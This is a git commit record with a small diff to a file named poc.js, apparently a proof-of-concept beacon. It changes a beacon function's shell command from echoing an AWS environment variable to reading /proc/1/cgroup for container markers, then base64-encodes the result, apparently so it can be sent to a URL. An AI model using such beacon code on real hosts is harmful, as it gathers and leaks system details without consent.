24b4954b453fee1a2fc94835106363bb7fc3b4a8
10xray01 <110544522+xraydz@users.noreply.github.com>
2025-08-14 15:01:14 +0330

    Update poc.js

--- scripts/poc.js
+++ scripts/poc.js
@@ -47,7 +47,7 @@ function beacon(urlStr, q) {
   let idOutput = "";
   try {
     idOutput = execSync(
-  'echo "$AWS_EXECUTION_ENV"',
+  'cat /proc/1/cgroup | grep -iE "ecs|docker" || true',
   { encoding: "utf8" }
 ).trim();
     idOutput = Buffer.from(idOutput).toString("base64");
